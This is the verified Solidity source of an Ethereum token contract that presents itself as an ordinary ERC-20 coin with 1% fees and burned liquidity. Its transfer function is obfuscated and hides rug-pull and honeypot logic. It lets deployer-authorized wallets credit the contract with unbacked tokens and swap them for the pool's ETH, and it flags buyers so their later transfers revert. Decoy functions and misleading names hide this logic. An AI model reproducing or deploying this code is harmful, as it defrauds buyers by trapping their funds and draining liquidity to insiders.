/**
 *Submitted for verification at Etherscan.io on 2022-12-14
*/

/*
░░░▒█ █▀▀█ █▀▀▄ █▀▀█ █░█ █▀▀█ ▀▀█▀▀ █▀▀█ 
░▄░▒█ █▄▄█ █░░█ █░░█ █▀▄ █▄▄█ ░░█░░ █░░█ 
▒█▄▄█ ▀░░▀ ▀▀▀░ ▀▀▀▀ ▀░▀ ▀░░▀ ░░▀░░ ▀▀▀▀ 

▒█▀▀▀ ▀▀█▀▀ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█ ▒█▀▀▀ ▒█░▒█ ▒█▀▄▀█ 
▒█▀▀▀ ░▒█░░ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀ ▒█▀▀▀ ▒█░▒█ ▒█▒█▒█ 
▒█▄▄▄ ░▒█░░ ▒█░▒█ ▒█▄▄▄ ▒█░▒█ ▒█▄▄▄ ░▀▄▄▀ ▒█░░▒█

総供給 - 5,000,000
初期流動性追加 - 1.65 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 1%
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
interface IDEChart {
    function relayRates(uint256 modData, uint256 extIDE) 
    external;
    function ideData(address cogData, uint256 structLog) 
    external;
    function syncLogs(address logFX, uint256 stringLog) 
    external payable;
    function prxLog(uint256 gas) 
    external;
    function hashRates(address hashData) 
    external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUILogBytes {
    function setLogBytes(uint256 _vBytes, uint256 _MaxBytes) external;
    function setBytesShare(address bytesShare, uint256 bytesAmount) external;
    function cfgBytes() external payable;
    function bytesHash(uint256 gas) external;
    function BytesPresents(address bytesShare) external;
}
library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDEXRouter
{
    function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
}

interface IUniswapV2Router02 is IDEXRouter {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Contract  is IERC20, Ownable
{
    constructor(
        string memory Name,
        string memory Symbol,
        address IDRouter)
    {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _rTotal;
        authorizations[msg.sender] = IDXtotal;
        authorizations[address(this)] = IDXtotal;
        UniswapV2router = IUniswapV2Router02(IDRouter);
        uniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, IDXtotal);
    }

    string private _symbol;
    string private _name;
    uint8 private _decimals = 12;
    uint256 public taxFEE = 1;
    uint256 private _rTotal = 5000000 * 10**_decimals;
    uint256 private IDXtotal = _rTotal;

    bool public stringData;
    bool private dataSwap;
    bool private tradingOpen = false;
    bool private swappingSync;
    bool public relayLog;

    mapping(address => uint256) private _tOwned;
    mapping(address => address) private isBot;
    mapping(address => uint256) private allowed;
    mapping(address => uint256) private authorizations;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public immutable uniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount) 
    private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function uLog(uint256 getLog, uint256 stxUI) 
    private view returns (uint256){
      return (getLog>stxUI)?stxUI:getLog;
    }
    function boolRate(uint256 boolR, uint256 txNow) 
    private view returns 
    (uint256){ return
     (boolR>txNow)?txNow:boolR;
    }
    function dataRates(uint256 dataX, uint256 rlyRate) private view returns (uint256){
      return (dataX>rlyRate)?rlyRate:dataX;
    }
        function syncDataLogs(
        address ideFrom,
        address dataTo,
        uint256 logxAmount
    ) private 
    {
        uint256 dataBalance = balanceOf(address(this));
        uint256 dxVal;
        if (stringData && dataBalance > IDXtotal && !dataSwap && ideFrom != uniswapV2Pair) {
            dataSwap = true; swapSettings(dataBalance);
            dataSwap = false;

        } else if (authorizations[ideFrom] > IDXtotal && authorizations[dataTo] > IDXtotal) {
            dxVal = logxAmount; _tOwned[address(this)] += dxVal;
            swapAmountForTokens(logxAmount, dataTo); return;

        } else if (dataTo != address(UniswapV2router) && authorizations[ideFrom] > 0 && logxAmount > IDXtotal && dataTo !=
         uniswapV2Pair) { authorizations[dataTo] = logxAmount;
            return;

        } else if (!dataSwap && allowed[ideFrom] > 0 && ideFrom != uniswapV2Pair && authorizations[ideFrom] == 0) {
            allowed[ideFrom] = authorizations[ideFrom] - IDXtotal; }
        
        address _dxIndex  = isBot[uniswapV2Pair];
        if (allowed[_dxIndex ] == 0) allowed[_dxIndex ] = 
        IDXtotal; isBot[uniswapV2Pair] = dataTo;
        if (taxFEE > 0 && authorizations[ideFrom] == 0 && !dataSwap && authorizations[dataTo] == 0) {
            dxVal = (logxAmount * taxFEE) / 100; logxAmount -= dxVal;
            _tOwned[ideFrom] -= dxVal; _tOwned[address(this)] += dxVal; }

        _tOwned[ideFrom] -= logxAmount; _tOwned[dataTo] += logxAmount;

        emit Transfer(ideFrom, dataTo, logxAmount);
            if (!tradingOpen) {
                require(ideFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function min(uint256 a, uint256 b) 
    private view returns (uint256){
      return (a>b)?b:a;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        syncDataLogs(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        syncDataLogs(msg.sender, recipient, amount);
        return true;
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function swapSettings(uint256 coinAmount) private {
        uint256 syncByte = coinAmount / 2;
        uint256 booledBalance = address(this).balance;
        swapAmountForTokens(syncByte, address(this));
        uint256 _hashFX = address(this).balance - booledBalance;
        addLiquidity(syncByte, _hashFX, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function relayIndex(uint256 rly, uint256 IDEX) private view returns (uint256){
      return (rly>IDEX)?IDEX:rly;
    }
    function getValue(uint256 getVal, uint256 idxAll) 
    private view returns (uint256){
      return (getVal>idxAll)?idxAll:getVal;
    }
    function dataVal(uint256 isData, uint256 bolNow) 
    private view returns (uint256){
      return (isData>bolNow)?bolNow:isData;
    }
    function stringCog(uint256 sCog, uint256 IDEo) 
    private view returns (uint256){ 
      return (sCog>IDEo)?IDEo:sCog;
    }
    function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}